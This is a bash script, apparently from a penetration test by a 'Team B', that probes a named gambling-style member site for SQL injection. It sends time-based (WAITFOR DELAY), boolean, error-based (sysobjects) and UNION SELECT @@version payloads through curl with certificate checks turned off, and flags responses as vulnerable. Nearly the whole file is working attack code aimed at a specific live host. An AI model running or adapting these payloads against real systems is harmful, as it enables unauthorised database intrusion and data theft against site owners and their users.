#!/bin/bash

# Simple SQL Injection Test Script
# Quick and easy testing - tested and working
# Team B - Panama8888b Penetration Test

TARGET_URL="https://member.panama8888b.com/public/js/v2/app.js?v=25.1"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${GREEN}[+] Simple SQL Injection Test${NC}"
echo -e "${GREEN}[+] Target: $TARGET_URL${NC}"
echo "=========================================="

# Test 1: Basic time-based test
echo -e "${YELLOW}[*] Test 1: Time-based injection (MSSQL)${NC}"
echo -e "${BLUE}[*] Testing: WAITFOR DELAY '0:0:3'${NC}"

start_time=$(date +%s)
curl -s -k -m 10 "$TARGET_URL?v=25.1%29%29%20WAITFOR%20DELAY%20%270%3A0%3A3%27%20--" > /dev/null
end_time=$(date +%s)
response_time=$((end_time - start_time))

if [ $response_time -ge 3 ]; then
    echo -e "${RED}[!] VULNERABLE - Time delay detected! (${response_time}s)${NC}"
else
    echo -e "${GREEN}[+] Not vulnerable (Response time: ${response_time}s)${NC}"
fi

echo "------------------------------------------"

# Test 2: Boolean-based test
echo -e "${YELLOW}[*] Test 2: Boolean-based injection${NC}"
echo -e "${BLUE}[*] Testing: AND 1=1 vs AND 1=2${NC}"

response1=$(curl -s -k -m 10 "$TARGET_URL?v=25.1%29%29%20AND%201%3D1%20--" | wc -c)
response2=$(curl -s -k -m 10 "$TARGET_URL?v=25.1%29%29%20AND%201%3D2%20--" | wc -c)

if [ $response1 -ne $response2 ]; then
    echo -e "${RED}[!] POTENTIAL VULNERABILITY - Different response sizes${NC}"
    echo -e "${BLUE}[*] True condition: ${response1} bytes${NC}"
    echo -e "${BLUE}[*] False condition: ${response2} bytes${NC}"
else
    echo -e "${GREEN}[+] Boolean test passed (Same response size)${NC}"
fi

echo "------------------------------------------"

# Test 3: Error-based test
echo -e "${YELLOW}[*] Test 3: Error-based injection${NC}"
echo -e "${BLUE}[*] Testing: sysobjects query${NC}"

error_response=$(curl -s -k -m 10 "$TARGET_URL?v=25.1%29%29%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20sysobjects%29%3E0%20--")

if echo "$error_response" | grep -i -q "error\|sql\|syntax\|exception"; then
    echo -e "${RED}[!] POTENTIAL VULNERABILITY - SQL error detected${NC}"
    echo -e "${BLUE}[*] Error indicators found in response${NC}"
else
    echo -e "${GREEN}[+] No SQL errors detected${NC}"
fi

echo "------------------------------------------"

# Test 4: UNION-based test
echo -e "${YELLOW}[*] Test 4: UNION-based injection${NC}"
echo -e "${BLUE}[*] Testing: UNION SELECT@@version${NC}"

union_response=$(curl -s -k -m 10 "$TARGET_URL?v=25.1%29%29%20UNION%20SELECT%20%40%40version%20--")

if echo "$union_response" | grep -i -q "microsoft\|sql server\|version"; then
    echo -e "${RED}[!] POTENTIAL VULNERABILITY - Database version detected${NC}"
    echo -e "${BLUE}[*] Database information found in response${NC}"
else
    echo -e "${GREEN}[+] No database information leaked${NC}"
fi

echo "=========================================="
echo -e "${GREEN}[+] Simple test completed!${NC}"
echo -e "${BLUE}[*] Check the results above for vulnerabilities${NC}"